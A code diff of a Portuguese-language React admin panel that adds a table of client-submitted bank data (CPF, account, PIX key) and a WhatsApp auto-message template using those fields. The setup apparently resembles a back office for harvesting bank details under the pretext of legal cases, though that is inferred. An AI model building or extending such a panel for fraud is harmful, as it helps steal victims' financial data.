@@ -5,7 +5,7 @@ import {
   ChevronDown, Landmark, Phone, CreditCard, Eye, Building2, KeyRound,
   Gavel, User, Clock, CheckCircle, LogOut, Calendar, TrendingUp,
   Users, Bell, RefreshCw, Upload, AlertCircle, Globe, Monitor, Smartphone,
-  ArrowUpDown, Database, Activity
+  ArrowUpDown, Database, Activity, Settings, MessageSquare
 } from 'lucide-react'
 
 function formatCPFInput(value) {
@@ -103,16 +103,20 @@ export default function AdminPage() {
   const [orderBy, setOrderBy] = useState('dados_primeiro')
   const [acessosPage, setAcessosPage] = useState(1)
   const [acessosPagination, setAcessosPagination] = useState({ total: 0, totalPages: 1 })
+  const [config, setConfig] = useState({ whatsapp_numero: '', whatsapp_mensagem: '' })
+  const [savingConfig, setSavingConfig] = useState(false)
   const LIMIT = 50
 
   useEffect(() => {
     if (activeTab === 'processos') {
       loadProcessos()
     } else if (activeTab === 'dados_enviados') {
-      loadProcessos('com_dados')
+      loadProsseguimentos()
     } else if (activeTab === 'acessos') {
       loadAcessos()
       loadAcessosStats()
+    } else if (activeTab === 'configuracoes') {
+      loadConfig()
     }
     loadProsseguimentos()
   }, [page, searchTerm, activeTab, orderBy, acessosPage])
@@ -174,6 +178,31 @@ export default function AdminPage() {
       setAcessosStats(data)
     } catch {
       console.error('Erro ao carregar estatísticas')
+    }
+  }
+
+  async function loadConfig() {
+    try {
+      const res = await fetch('/api/configuracoes')
+      const data = await res.json()
+      setConfig(data)
+    } catch {
+      console.error('Erro ao carregar configurações')
+    }
+  }
+
+  async function saveConfig() {
+    setSavingConfig(true)
+    try {
+      await fetch('/api/configuracoes', {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(config)
+      })
+    } catch {
+      console.error('Erro ao salvar configurações')
+    } finally {
+      setSavingConfig(false)
     }
   }
 
@@ -400,6 +429,15 @@ export default function AdminPage() {
                 {acessosStats.total.toLocaleString()}
               </span>
             </button>
+            <button
+              onClick={() => { setActiveTab('configuracoes'); }}
+              className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl font-medium text-sm transition-colors ${
+                activeTab === 'configuracoes' ? 'bg-amber-500/10 text-amber-400' : 'text-gray-400 hover:text-white hover:bg-white/5'
+              }`}
+            >
+              <Settings className="w-4 h-4" />
+              <span>Configurações</span>
+            </button>
           </div>
         </nav>
 
@@ -425,11 +463,13 @@ export default function AdminPage() {
                 {activeTab === 'processos' && 'Processos'}
                 {activeTab === 'dados_enviados' && 'Dados Enviados'}
                 {activeTab === 'acessos' && 'Acessos'}
+                {activeTab === 'configuracoes' && 'Configurações'}
               </h2>
               <p className="text-sm text-gray-500">
                 {activeTab === 'processos' && 'Gerencie todos os processos cadastrados'}
                 {activeTab === 'dados_enviados' && 'Clientes que enviaram dados bancários'}
                 {activeTab === 'acessos' && 'Monitoramento de acessos ao sistema'}
+                {activeTab === 'configuracoes' && 'Configure WhatsApp e mensagens automáticas'}
               </p>
             </div>
             <div className="flex items-center gap-3">
@@ -458,8 +498,18 @@ export default function AdminPage() {
         </header>
 
         <div className="p-8">
-          {/* CONTEÚDO DA ABA PROCESSOS / DADOS ENVIADOS */}
-          {(activeTab === 'processos' || activeTab === 'dados_enviados') && (
+          {/* Loading overlay */}
+          {refreshing && (
+            <div className="fixed inset-0 bg-black/30 backdrop-blur-sm z-50 flex items-center justify-center">
+              <div className="bg-[#1e293b] rounded-2xl p-6 flex items-center gap-4 shadow-2xl border border-white/10">
+                <div className="w-8 h-8 border-3 border-[#2364af]/30 border-t-[#2364af] rounded-full animate-spin" />
+                <span className="text-white font-medium">Carregando dados...</span>
+              </div>
+            </div>
+          )}
+
+          {/* CONTEÚDO DA ABA PROCESSOS */}
+          {activeTab === 'processos' && (
             <>
               {/* Stats */}
               <div className="grid grid-cols-4 gap-4 mb-8">
@@ -710,6 +760,112 @@ export default function AdminPage() {
             </>
           )}
 
+          {/* CONTEÚDO DA ABA DADOS ENVIADOS */}
+          {activeTab === 'dados_enviados' && (
+            <>
+              {/* Stats */}
+              <div className="grid grid-cols-3 gap-4 mb-8">
+                <div className="bg-[#1e293b] rounded-2xl border border-white/5 p-5">
+                  <div className="flex items-center gap-3 mb-2">
+                    <Database className="w-5 h-5 text-emerald-500" />
+                    <p className="text-xs text-gray-500">Total de Envios</p>
+                  </div>
+                  <p className="text-2xl font-bold text-white">{prosseguimentos.length}</p>
+                </div>
+                <div className="bg-[#1e293b] rounded-2xl border border-white/5 p-5">
+                  <div className="flex items-center gap-3 mb-2">
+                    <Calendar className="w-5 h-5 text-violet-500" />
+                    <p className="text-xs text-gray-500">Hoje</p>
+                  </div>
+                  <p className="text-2xl font-bold text-white">
+                    {prosseguimentos.filter(p => new Date(p.criado_em).toDateString() === new Date().toDateString()).length}
+                  </p>
+                </div>
+                <div className="bg-[#1e293b] rounded-2xl border border-white/5 p-5">
+                  <div className="flex items-center gap-3 mb-2">
+                    <Landmark className="w-5 h-5 text-amber-500" />
+                    <p className="text-xs text-gray-500">Bancos Diferentes</p>
+                  </div>
+                  <p className="text-2xl font-bold text-white">
+                    {new Set(prosseguimentos.map(p => p.banco)).size}
+                  </p>
+                </div>
+              </div>
+
+              {/* Tabela de Prosseguimentos */}
+              <div className="bg-[#1e293b] rounded-2xl border border-white/5 overflow-hidden">
+                <table className="w-full text-sm">
+                  <thead>
+                    <tr className="border-b border-white/5">
+                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Data</th>
+                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Titular</th>
+                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">CPF</th>
+                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Telefone</th>
+                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Banco</th>
+                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">Agência/Conta</th>
+                      <th className="text-left px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider">PIX</th>
+                      <th className="text-center px-6 py-4 font-semibold text-gray-400 text-xs uppercase tracking-wider w-20">Ações</th>
+                    </tr>
+                  </thead>
+                  <tbody className="divide-y divide-white/5">
+                    {prosseguimentos.length === 0 ? (
+                      <tr>
+                        <td colSpan={8} className="px-6 py-20 text-center">
+                          <Database className="w-12 h-12 text-gray-700 mx-auto mb-4" />
+                          <p className="text-gray-400 font-medium mb-1">Nenhum dado bancário enviado</p>
+                          <p className="text-gray-600 text-xs">Os dados aparecerão aqui quando clientes preencherem</p>
+                        </td>
+                      </tr>
+                    ) : prosseguimentos.map(p => (
+                      <tr key={p.id} className="hover:bg-white/5 transition-colors">
+                        <td className="px-6 py-4">
+                          <div className="flex items-center gap-2">
+                            <Clock className="w-4 h-4 text-gray-500" />
+                            <span className="text-white text-sm">{formatDate(p.criado_em)}</span>
+                          </div>
+                        </td>
+                        <td className="px-6 py-4">
+                          <p className="text-white font-medium">{p.titular || '-'}</p>
+                        </td>
+                        <td className="px-6 py-4">
+                          <span className="text-gray-300 font-mono text-sm">{p.cpf_titular || p.cpf}</span>
+                        </td>
+                        <td className="px-6 py-4">
+                          <div className="flex items-center gap-2">
+                            <Phone className="w-4 h-4 text-emerald-500" />
+                            <span className="text-gray-300">{p.telefone}</span>
+                          </div>
+                        </td>
+                        <td className="px-6 py-4">
+                          <span className="text-gray-300">{p.banco}</span>
+                        </td>
+                        <td className="px-6 py-4">
+                          <div className="text-gray-300">
+                            <span className="text-xs text-gray-500">Ag:</span> {p.agencia}{' '}
+                            <span className="text-xs text-gray-500">Cc:</span> {p.conta}
+                            <span className="text-xs text-gray-500 ml-1">({p.tipo_conta})</span>
+                          </div>
+                        </td>
+                        <td className="px-6 py-4">
+                          <span className="text-gray-300 font-mono text-sm">{p.chave_pix || '-'}</span>
+                        </td>
+                        <td className="px-6 py-4">
+                          <button
+                            onClick={() => setDeleteDadoConfirm(p.id)}
+                            className="p-2 text-gray-500 hover:text-red-400 hover:bg-red-500/10 rounded-lg transition-all cursor-pointer"
+                            title="Excluir"
+                          >
+                            <Trash2 className="w-4 h-4" />
+                          </button>
+                        </td>
+                      </tr>
+                    ))}
+                  </tbody>
+                </table>
+              </div>
+            </>
+          )}
+
           {/* CONTEÚDO DA ABA ACESSOS */}
           {activeTab === 'acessos' && (
             <>
@@ -844,6 +1000,74 @@ export default function AdminPage() {
                 )}
               </div>
             </>
+          )}
+
+          {/* CONTEÚDO DA ABA CONFIGURAÇÕES */}
+          {activeTab === 'configuracoes' && (
+            <div className="space-y-6">
+              {/* WhatsApp Config */}
+              <div className="bg-[#1e293b] rounded-2xl border border-white/5 p-6">
+                <div className="flex items-center gap-3 mb-6">
+                  <div className="w-10 h-10 bg-emerald-500/10 rounded-xl flex items-center justify-center">
+                    <MessageSquare className="w-5 h-5 text-emerald-500" />
+                  </div>
+                  <div>
+                    <h3 className="text-lg font-semibold text-white">Configurações do WhatsApp</h3>
+                    <p className="text-sm text-gray-500">Configure número e mensagem automática</p>
+                  </div>
+                </div>
+
+                <div className="space-y-4">
+                  <div>
+                    <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">
+                      Número do WhatsApp (com código do país)
+                    </label>
+                    <input
+                      type="text"
+                      value={config.whatsapp_numero || ''}
+                      onChange={e => setConfig({ ...config, whatsapp_numero: e.target.value })}
+                      placeholder="5511999999999"
+                      className="w-full px-4 py-3 bg-[#0f172a] border border-white/10 rounded-xl text-white placeholder:text-gray-500 focus:border-[#2364af] transition-all text-sm"
+                    />
+                    <p className="text-xs text-gray-500 mt-1">Formato: código do país + DDD + número (sem espaços ou símbolos)</p>
+                  </div>
+
+                  <div>
+                    <label className="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">
+                      Mensagem Automática
+                    </label>
+                    <textarea
+                      value={config.whatsapp_mensagem || ''}
+                      onChange={e => setConfig({ ...config, whatsapp_mensagem: e.target.value })}
+                      rows={8}
+                      placeholder="Digite a mensagem..."
+                      className="w-full px-4 py-3 bg-[#0f172a] border border-white/10 rounded-xl text-white placeholder:text-gray-500 focus:border-[#2364af] transition-all text-sm font-mono resize-none"
+                    />
+                    <div className="mt-2 p-3 bg-[#0f172a] rounded-lg border border-white/5">
+                      <p className="text-xs font-semibold text-gray-400 mb-2">Variáveis disponíveis:</p>
+                      <div className="flex flex-wrap gap-2">
+                        {['{nome}', '{processo}', '{cpf}', '{banco}', '{agencia}', '{conta}', '{tipo_conta}', '{titular}', '{cpf_titular}', '{pix}'].map(v => (
+                          <code key={v} className="px-2 py-1 bg-[#2364af]/20 text-[#2364af] rounded text-xs">{v}</code>
+                        ))}
+                      </div>
+                    </div>
+                  </div>
+
+                  <button
+                    onClick={saveConfig}
+                    disabled={savingConfig}
+                    className="bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700 disabled:opacity-50 text-white px-6 py-3 rounded-xl text-sm font-semibold flex items-center gap-2 transition-all"
+                  >
+                    {savingConfig ? (
+                      <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                    ) : (
+                      <Save className="w-4 h-4" />
+                    )}
+                    Salvar Configurações
+                  </button>
+                </div>
+              </div>
+            </div>
           )}
         </div>
       </main>
